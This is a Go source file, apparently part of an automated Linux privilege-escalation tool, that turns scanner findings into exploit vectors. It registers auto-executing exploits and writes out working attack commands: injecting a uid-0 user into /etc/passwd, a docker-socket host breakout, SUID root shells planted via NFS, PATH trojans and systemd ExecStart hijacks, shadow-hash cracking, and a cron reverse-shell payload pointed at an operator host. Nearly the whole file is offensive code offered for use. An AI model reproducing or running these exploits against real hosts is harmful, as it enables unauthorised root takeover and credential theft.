package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
)

// ================================================================
// FASE 2 — Enumeration: scanner findings → exploit vectors
// ================================================================

// validVectors lists every --vector name accepted on the CLI.
var validVectors = map[string]bool{
	"suid": true, "sudo": true, "cron": true, "passwd": true, "shadow": true,
	"docker": true, "caps": true, "nfs": true, "path": true, "service": true,
	"kernel": true, "cred": true,
}

// parseVectorList splits and validates a comma-separated --vector argument.
func parseVectorList(s string) ([]string, error) {
	seen := map[string]bool{}
	var out []string
	for _, part := range strings.Split(s, ",") {
		name := strings.ToLower(strings.TrimSpace(part))
		if name == "" {
			continue
		}
		if !validVectors[name] {
			return nil, fmt.Errorf("unknown vector %q (valid: %s)", name, vectorNames())
		}
		if !seen[name] {
			seen[name] = true
			out = append(out, name)
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("empty --vector list (valid: %s)", vectorNames())
	}
	return out, nil
}

func vectorNames() string {
	names := make([]string, 0, len(validVectors))
	for k := range validVectors {
		names = append(names, k)
	}
	sort.Strings(names)
	return strings.Join(names, ",")
}

func enumerateAll(p *AutoPrivilege) {
	logEnumStart(p.Opts)
	for _, f := range p.Findings {
		if !f.Exploitable {
			continue
		}
		switch f.Source {
		case "SUID":
			enumerateSUID(p, f)
		case "SUDO":
			enumerateSUDO(p, f)
		case "CRON":
			enumerateCRON(p, f)
		case "FILE":
			if f.Target == "/etc/passwd" {
				enumeratePasswd(p)
			}
			if f.Target == "/etc/shadow" && strings.Contains(f.Description, "Writable") {
				enumerateShadowWrite(p)
			} else if f.Target == "/etc/shadow" {
				enumerateShadowRead(p)
			}
		case "DOCKER":
			enumerateDocker(p)
		case "CAPS":
			enumerateCaps(p, f)
		case "NFS":
			enumerateNFS(p, f)
		case "KERNEL":
			enumerateKernelCVE(p, f)
		case "CRED":
			enumerateCredential(p, f)
		case "PATH":
			enumeratePATH(p, f)
		case "SERVICE":
			enumerateService(p, f)
		}
	}
}

func enumerateVectors(p *AutoPrivilege, names []string) {
	for _, name := range names {
		for _, f := range p.Findings {
			if !f.Exploitable {
				continue
			}
			switch name {
			case "suid":
				if f.Source == "SUID" {
					enumerateSUID(p, f)
				}
			case "sudo":
				if f.Source == "SUDO" {
					enumerateSUDO(p, f)
				}
			case "cron":
				if f.Source == "CRON" {
					enumerateCRON(p, f)
				}
			case "passwd":
				if f.Source == "FILE" && f.Target == "/etc/passwd" {
					enumeratePasswd(p)
				}
			case "shadow":
				if f.Source == "FILE" && f.Target == "/etc/shadow" {
					if strings.Contains(f.Description, "Writable") {
						enumerateShadowWrite(p)
					} else {
						enumerateShadowRead(p)
					}
				}
			case "docker":
				if f.Source == "DOCKER" {
					enumerateDocker(p)
				}
			case "caps":
				if f.Source == "CAPS" {
					enumerateCaps(p, f)
				}
			case "nfs":
				if f.Source == "NFS" {
					enumerateNFS(p, f)
				}
			case "path":
				if f.Source == "PATH" {
					enumeratePATH(p, f)
				}
			case "service":
				if f.Source == "SERVICE" {
					enumerateService(p, f)
				}
			case "kernel":
				if f.Source == "KERNEL" {
					enumerateKernelCVE(p, f)
				}
			case "cred":
				if f.Source == "CRED" {
					enumerateCredential(p, f)
				}
			}
		}
	}
}

// addVector registers an auto-exploitable vector.
func addVector(p *AutoPrivilege, name, category, target, command string, risk RiskLevel, fn func() *ExploitResult, meta map[string]string) {
	p.Vectors = append(p.Vectors, Vector{
		Name: name, Category: category, Target: target,
		Command: command, Risk: risk, Exploit: fn, Meta: meta,
	})
}

// addManualVector registers a vector the operator runs by hand: the tool
// prints the exact command instead of pretending it executed something.
func addManualVector(p *AutoPrivilege, name, category, target, command string, risk RiskLevel, meta map[string]string) {
	if meta == nil {
		meta = map[string]string{}
	}
	meta["manual"] = "true"
	addVector(p, name, category, target, command, risk, nil, meta)
}

// --- SUID enumeration ---
func enumerateSUID(p *AutoPrivilege, f Finding) {
	bin := extractBinName(f.Target)
	cmd, ok := getCommand(bin)
	if !ok {
		return
	}

	risk := RiskLow
	if isSuidShellBin(bin) {
		risk = RiskHigh
	}

	addVector(p, "SUID "+bin, "suid", f.Target, cmd, risk,
		func() *ExploitResult {
			return exploitSUID(f.Target, cmd, p.Opts)
		},
		map[string]string{"bin": bin, "path": f.Target})
}

// --- SUDO enumeration ---
func enumerateSUDO(p *AutoPrivilege, f Finding) {
	if f.Target == "ALL" {
		addVector(p, "sudo ALL", "sudo", "sudo -i", "sudo -i", RiskHigh,
			func() *ExploitResult {
				return exploitSudoALL(p.Opts)
			}, nil)
		return
	}

	bin := extractBinName(f.Target)
	cmd, ok := getCommand(bin)
	if !ok {
		return
	}

	risk := RiskMedium
	if strings.Contains(f.Description, "NOPASSWD") {
		risk = RiskHigh
	}

	addVector(p, "sudo "+bin, "sudo", f.Target, "sudo "+cmd, risk,
		func() *ExploitResult {
			return exploitSudo(f.Target, cmd, p.Opts)
		},
		map[string]string{"bin": bin, "path": f.Target})
}

// --- Cron enumeration ---
func enumerateCRON(p *AutoPrivilege, f Finding) {
	addVector(p, "cron "+f.Target, "cron", f.Target,
		fmt.Sprintf("echo '%s' >> %s", cronPayload(p.Opts.LHost, p.Opts.LPort, f.Target), f.Target), RiskHigh,
		func() *ExploitResult {
			return exploitCron(f.Target, p.Opts)
		},
		map[string]string{"path": f.Target})
}

// --- Passwd enumeration ---
func enumeratePasswd(p *AutoPrivilege) {
	addVector(p, "passwd injection", "passwd", "/etc/passwd",
		"echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd", RiskHigh,
		func() *ExploitResult {
			return exploitPasswd()
		}, nil)
}

func enumerateShadowRead(p *AutoPrivilege) {
	addVector(p, "shadow readable", "shadow", "/etc/shadow",
		"cat /etc/shadow   # then: john --wordlist=rockyou.txt hash.txt", RiskHigh,
		func() *ExploitResult {
			return readRootHash()
		}, nil)
}

func enumerateShadowWrite(p *AutoPrivilege) {
	addManualVector(p, "shadow overwrite", "shadow", "/etc/shadow",
		"mkpasswd -m sha-512 'newpass'   # then edit root's hash in /etc/shadow", RiskDanger,
		map[string]string{"warning": "corrupting /etc/shadow can lock the system"})
}

// --- Docker enumeration ---
func enumerateDocker(p *AutoPrivilege) {
	addVector(p, "docker breakout", "docker", "/var/run/docker.sock",
		"docker run --rm -v /:/mnt alpine chroot /mnt /bin/sh", RiskHigh,
		func() *ExploitResult {
			return exploitDocker(p.Opts)
		}, nil)
}

// --- Capabilities enumeration ---
func enumerateCaps(p *AutoPrivilege, f Finding) {
	// File capability finding: Target is "cap_setuid:/path/to/bin".
	if path, ok := strings.CutPrefix(f.Target, "cap_setuid:"); ok {
		cmd := capSetuidPayload(path)
		addVector(p, "cap_setuid "+filepath.Base(path), "caps", path, cmd, RiskMedium,
			func() *ExploitResult {
				return exploitCapBin(path, p.Opts)
			}, nil)
		return
	}
	if f.Target == "cap_setuid" {
		// Our own process holds cap_setuid → in-process setuid(0).
		addVector(p, "cap_setuid (self)", "caps", fmt.Sprintf("pid %d", os.Getpid()),
			"syscall.Setuid(0) — in-process", RiskMedium,
			func() *ExploitResult {
				return exploitSelfCaps()
			}, nil)
		return
	}
	// Other capabilities → manual guidance only.
	addManualVector(p, "caps "+f.Target, "caps", f.Target,
		"review capability: "+f.Description, RiskLow, nil)
}

// --- NFS enumeration (manual: needs a second root-capable mount point) ---
func enumerateNFS(p *AutoPrivilege, f Finding) {
	export := strings.Fields(f.Target)
	if len(export) == 0 {
		export = []string{f.Target}
	}
	addManualVector(p, "NFS no_root_squash", "nfs", export[0],
		fmt.Sprintf("mkdir /tmp/nfs && mount -t nfs %s /tmp/nfs && cp /bin/bash /tmp/nfs/rootbash && chmod u+s /tmp/nfs/rootbash", export[0]),
		RiskHigh,
		map[string]string{"note": "mount from a host where you already have root; SUID shell then works on the target"})
}

// --- Kernel CVE enumeration (manual: exploits are not bundled) ---
func enumerateKernelCVE(p *AutoPrivilege, f Finding) {
	addManualVector(p, f.Target, "kernel", f.Target,
		fmt.Sprintf("# %s\n# compile the public exploit for this kernel, or update the host", f.Description),
		f.Risk, map[string]string{"cve": f.Target})
}

// --- Credential enumeration ---
func enumerateCredential(p *AutoPrivilege, f Finding) {
	if isSSHPrivateKey(f.Target) {
		addManualVector(p, "ssh-key "+filepath.Base(f.Target), "cred", f.Target,
			fmt.Sprintf("ssh -i %s <user>@<host>", f.Target), RiskHigh,
			map[string]string{"type": "ssh-private-key"})
	}
}

// --- PATH enumeration (manual: payload must wait for a privileged caller) ---
func enumeratePATH(p *AutoPrivilege, f Finding) {
	addManualVector(p, "PATH planting "+f.Target, "path", f.Target,
		fmt.Sprintf("# drop a trojan binary in %s and wait for a privileged process to resolve it\nprintf '#!/bin/sh\\ncp /bin/bash /tmp/rootbash\\nchmod u+s /tmp/rootbash\\n' > %s/.payload && chmod +x %s/.payload",
			f.Target, f.Target, f.Target),
		RiskHigh, nil)
}

// --- Service enumeration (manual: restarting the unit is user-visible) ---
func enumerateService(p *AutoPrivilege, f Finding) {
	addManualVector(p, "systemd hijack "+filepath.Base(f.Target), "service", f.Target,
		fmt.Sprintf("# point ExecStart of %s at your payload, then:\nsed -i 's|^ExecStart=.*|ExecStart=/bin/sh -c \"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\"|' %s\nsystemctl daemon-reload && systemctl restart %s",
			filepath.Base(f.Target), f.Target, strings.TrimSuffix(filepath.Base(f.Target), ".service")),
		RiskHigh, nil)
}

// Helper
func extractBinName(path string) string {
	return filepath.Base(path)
}

// isSSHPrivateKey reports whether a path looks like a private SSH key.
func isSSHPrivateKey(path string) bool {
	base := filepath.Base(path)
	for _, suffix := range []string{"_rsa", "_ed25519", "_ecdsa", "_dsa"} {
		if strings.HasSuffix(base, suffix) {
			return true
		}
	}
	return base == "id_rsa" || base == "id_ed25519" || base == "id_ecdsa" || base == "id_dsa"
}
